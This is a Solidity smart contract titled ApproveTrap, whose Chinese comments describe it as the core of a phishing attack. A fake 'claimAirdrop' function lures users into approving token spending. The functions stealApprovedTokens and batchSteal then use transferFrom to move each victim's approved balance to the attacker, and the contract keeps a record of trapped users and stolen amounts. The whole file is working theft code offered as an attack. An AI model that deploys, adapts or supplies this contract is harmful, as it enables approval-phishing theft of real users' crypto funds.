// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title ApproveTrap
 * @notice 授权陷阱合约 - 钓鱼攻击核心
 * @dev 诱导用户授权后，通过transferFrom窃取资金
 */
contract ApproveTrap {
    address public attacker;
    string public fakeName;
    string public fakeSymbol;

    // 记录哪些地址已经授权
    mapping(address => bool) public trappedUsers;
    mapping(address => uint256) public stolenAmounts;

    event UserTrapped(address indexed user, address token, uint256 amount);
    event TokensStolen(address indexed user, address token, uint256 amount);

    constructor(string memory _name, string memory _symbol) {
        attacker = msg.sender;
        fakeName = _name;
        fakeSymbol = _symbol;
    }

    /**
     * @notice 诱饵函数：诱导用户调用approve
     * @param token 目标代币
     * @param amount 授权金额
     */
    function claimAirdrop(address token, uint256 amount) external {
        // 诱导用户授权此合约使用其代币
        // 用户需要在外部先调用 token.approve(address(this), amount)
        trappedUsers[msg.sender] = true;
        emit UserTrapped(msg.sender, token, amount);
    }

    /**
     * @notice 窃取已授权用户的代币
     * @param token 目标代币合约
     * @param victim 受害者地址
     */
    function stealApprovedTokens(address token, address victim) external returns (uint256) {
        require(msg.sender == attacker, "Not attacker");

        IERC20 tok = IERC20(token);
        uint256 allowance = tok.allowance(victim, address(this));

        if (allowance > 0) {
            uint256 balance = tok.balanceOf(victim);
            uint256 stealAmount = allowance > balance ? balance : allowance;

            bool success = tok.transferFrom(victim, attacker, stealAmount);
            if (success) {
                stolenAmounts[victim] += stealAmount;
                emit TokensStolen(victim, token, stealAmount);
                return stealAmount;
            }
        }
        return 0;
    }

    /**
     * @notice 批量窃取多个受害者
     * @param token 目标代币
     * @param victims 受害者列表
     */
    function batchSteal(address token, address[] calldata victims) external {
        require(msg.sender == attacker, "Not attacker");
        for (uint256 i = 0; i < victims.length; i++) {
            stealApprovedTokens(token, victims[i]);
        }
    }

    /**
     * @notice 检查用户是否已授权
     */
    function checkAllowance(address token, address user) external view returns (uint256) {
        return IERC20(token).allowance(user, address(this));
    }
}.
